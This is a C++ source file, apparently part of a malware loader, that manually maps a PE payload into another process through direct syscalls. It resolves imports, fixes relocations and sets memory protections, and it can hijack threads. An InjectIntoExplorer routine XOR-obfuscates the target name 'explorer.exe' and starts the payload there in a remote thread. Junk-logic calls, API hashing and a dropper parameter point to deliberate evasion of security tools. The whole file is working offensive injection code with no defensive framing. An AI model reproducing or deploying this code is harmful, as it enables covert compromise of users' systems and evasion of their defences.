#include "Injector.h"
#include "Syscalls.h"
#include "NtStructs.h"
#include "JunkLogic.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../utils/Obfuscator.h"
#include "../utils/ApiHasher.h"
#include <tlhelp32.h>
#include <algorithm>
#include <cwctype>

namespace evasion {

namespace {
    struct RELOC_ENTRY {
        WORD Offset : 12;
        WORD Type : 4;
    };
}

bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID* ppRemoteBase) {
    JunkLogic::PerformComplexMath();

    PBYTE pSrcData = (PBYTE)payload.data();
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);

    PVOID pTargetBase = NULL;
    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;

    // 1. Allocate memory in target process (Initial RW for mapping)
    NTSTATUS status = SysNtAllocateVirtualMemory(hProcess, &pTargetBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) return false;

    JunkLogic::GenerateEntropy();

    // 2. Map sections to a local buffer first for easier processing
    std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage, 0);
    PBYTE pLocalBase = localMapping.data();

    // Copy Headers
    memcpy(pLocalBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders);

    // Copy Sections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData == 0) continue;
        PVOID pDest = pLocalBase + pSectionHeader[i].VirtualAddress;
        PVOID pSrc = pSrcData + pSectionHeader[i].PointerToRawData;
        memcpy(pDest, pSrc, pSectionHeader[i].SizeOfRawData);
    }

    JunkLogic::ScrambleMemory();

    // 3. Process Relocations
    DWORD_PTR delta = (DWORD_PTR)pTargetBase - pNtHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        auto& relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pLocalBase + relocDir.VirtualAddress);
            while (pReloc->VirtualAddress != 0) {
                DWORD count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntry = (PWORD)(pReloc + 1);
                for (DWORD i = 0; i < count; i++) {
                    WORD type = pEntry[i] >> 12;
                    WORD offset = pEntry[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        PDWORD_PTR pAddr = (PDWORD_PTR)(pLocalBase + pReloc->VirtualAddress + offset);
                        *pAddr += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                         PDWORD pAddr = (PDWORD)(pLocalBase + pReloc->VirtualAddress + offset);
                         *pAddr += (DWORD)delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc->SizeOfBlock);
            }
        }
    }

    JunkLogic::PerformComplexMath();

    // 4. Resolve Imports
    auto& importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pLocalBase + importDir.VirtualAddress);
        while (pImportDesc->Name != 0) {
            char* szDllName = (char*)(pLocalBase + pImportDesc->Name);

            // Ensure the target process has the DLL loaded
            PVOID remoteDllName = NULL;
            SIZE_T dllNameLen = strlen(szDllName) + 1;
            if (NT_SUCCESS(SysNtAllocateVirtualMemory(hProcess, &remoteDllName, 0, &dllNameLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
                SysNtWriteVirtualMemory(hProcess, remoteDllName, szDllName, dllNameLen, NULL);
                HANDLE hThread = NULL;
                SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), remoteDllName, 0, 0, 0, 0, NULL);
                if (hThread) {
                    SysNtWaitForSingleObject(hThread, FALSE, NULL);
                    CloseHandle(hThread);
                }
                SIZE_T freeSize = 0;
                SysNtFreeVirtualMemory(hProcess, &remoteDllName, &freeSize, MEM_RELEASE);
            }

            HMODULE hDll = GetModuleHandleA(szDllName);
            if (!hDll) hDll = LoadLibraryA(szDllName);
            if (hDll) {
                PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pLocalBase + pImportDesc->FirstThunk);
                PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)(pLocalBase + (pImportDesc->OriginalFirstThunk ? pImportDesc->OriginalFirstThunk : pImportDesc->FirstThunk));
                while (pThunk->u1.AddressOfData != 0) {
                    FARPROC pFunc = NULL;
                    if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal)) {
                        pFunc = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
                    } else {
                        PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pLocalBase + pOriginalThunk->u1.AddressOfData);
                        pFunc = GetProcAddress(hDll, (LPCSTR)pImportByName->Name);
                    }
                    if (pFunc) {
                        pThunk->u1.Function = (DWORD_PTR)pFunc;
                    }
                    pThunk++;
                    pOriginalThunk++;
                }
            }
            pImportDesc++;
        }
    }

    JunkLogic::GenerateEntropy();

    // 5. Write the processed image to the target process
    if (!NT_SUCCESS(SysNtWriteVirtualMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL))) {
        return false;
    }

    // 6. Set section protections (Avoid RWX where possible)
    PIMAGE_SECTION_HEADER pSect = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        PVOID pSectionAddr = (PVOID)((PBYTE)pTargetBase + pSect[i].VirtualAddress);
        SIZE_T sSize = pSect[i].Misc.VirtualSize;
        if (sSize == 0) sSize = pSect[i].SizeOfRawData;

        DWORD flProtect = 0;
        if (pSect[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (pSect[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
                // Some code sections might need RWX if they self-modify or for specific hooks
                // but we prefer RX if possible. For manual mapping, we'll stick to RX unless
                // characteristics explicitly demand WRITE.
                flProtect = PAGE_EXECUTE_READWRITE;
            }
            else if (pSect[i].Characteristics & IMAGE_SCN_MEM_READ) flProtect = PAGE_EXECUTE_READ;
            else flProtect = PAGE_EXECUTE;
        } else {
            if (pSect[i].Characteristics & IMAGE_SCN_MEM_WRITE) flProtect = PAGE_READWRITE;
            else if (pSect[i].Characteristics & IMAGE_SCN_MEM_READ) flProtect = PAGE_READONLY;
            else flProtect = PAGE_NOACCESS;
        }

        DWORD oldP;
        SysNtProtectVirtualMemory(hProcess, &pSectionAddr, &sSize, flProtect, &oldP);
    }

    if (ppRemoteBase) *ppRemoteBase = pTargetBase;
    return true;
}

bool Injector::HijackThread(HANDLE hThread, PVOID pEntryPoint) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_CONTROL;

    if (!NT_SUCCESS(SysNtSuspendThread(hThread, NULL))) return false;
    if (!NT_SUCCESS(SysNtGetContextThread(hThread, &ctx))) {
        SysNtResumeThread(hThread, NULL);
        return false;
    }

#ifdef _M_AMD64
    ctx.Rip = (DWORD64)pEntryPoint;
#else
    ctx.Eip = (DWORD)pEntryPoint;
#endif

    if (!NT_SUCCESS(SysNtSetContextThread(hThread, &ctx))) {
        SysNtResumeThread(hThread, NULL);
        return false;
    }

    SysNtResumeThread(hThread, NULL);
    SysNtResumeThread(hThread, NULL);
    return true;
}

DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
        std::wstring targetProcess = processName;
        for (auto& c : targetProcess) c = (wchar_t)::towlower(c);

        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                std::wstring currentProcess = pe.szExeFile;
                for (auto& c : currentProcess) c = (wchar_t)::towlower(c);
                if (currentProcess == targetProcess) { pid = pe.th32ProcessID; break; }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
    (void)dropperPath;
    const wchar_t kExplorerEnc[] = { L'e'^0x4B, L'x'^0x1F, L'p'^0x8C, L'l'^0x3E, L'o'^0x4B, L'r'^0x1F, L'e'^0x8C, L'r'^0x3E, L'.'^0x4B, L'e'^0x1F, L'x'^0x8C, L'e'^0x3E }; // explorer.exe
    std::wstring explorer = utils::DecryptW(kExplorerEnc, sizeof(kExplorerEnc)/sizeof(kExplorerEnc[0]));
    DWORD pid = GetProcessIdByName(explorer);
    if (pid == 0) return false;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) return false;

    PVOID pRemoteBase = NULL;
    bool success = MapAndInject(hProcess, payload, &pRemoteBase);
    if (success) {
        PBYTE pSrcData = (PBYTE)payload.data();
        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
        PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

        HANDLE hRemoteThread = NULL;
        NTSTATUS status = SysNtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hProcess, pEntryPoint, NULL, 0, 0, 0, 0, NULL);
        if (NT_SUCCESS(status)) {
            CloseHandle(hRemoteThread);
        } else {
            success = false;
        }
    }
    CloseHandle(hProcess);
    return success;
}

} // namespace evasion
